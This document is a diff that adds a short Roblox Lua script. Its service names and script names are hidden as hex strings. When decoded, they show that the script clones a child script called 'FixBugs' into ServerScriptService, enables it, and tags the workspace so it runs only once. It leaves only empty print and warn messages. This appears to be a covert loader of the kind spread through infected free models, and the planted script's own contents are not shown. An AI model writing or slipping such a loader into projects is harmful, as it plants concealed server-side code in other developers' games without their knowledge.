@@ -1,0 +1,29 @@
+local function dcs(s)
+	local t = {}
+	for i = 1, #s, 2 do
+		local hex = s:sub(i, i+1)
+		table.insert(t, string.char(tonumber(hex, 16)))
+	end
+	return table.concat(t)
+end
+local _a = script[dcs("46697842756773")]
+local _b = game:GetService(dcs("53657276657253637269707453657276696365"))
+local _c = game:GetService(dcs("436f6c6c656374696f6e53657276696365")) 
+local _d = dcs("46697842756773496e736572746564") 
+if _c:HasTag(workspace, _d) then
+	return
+end
+_c:AddTag(workspace, _d)
+if not _b:FindFirstChild(dcs("46697842756773")) then
+	local _e, _f = pcall(function()
+		local _g = _a:Clone()
+		_g.Parent = _b
+		_g.Enabled = true
+		return _g
+	end)
+    if _e and _f then
+		print("")
+	else
+		warn("")
+	end
+end
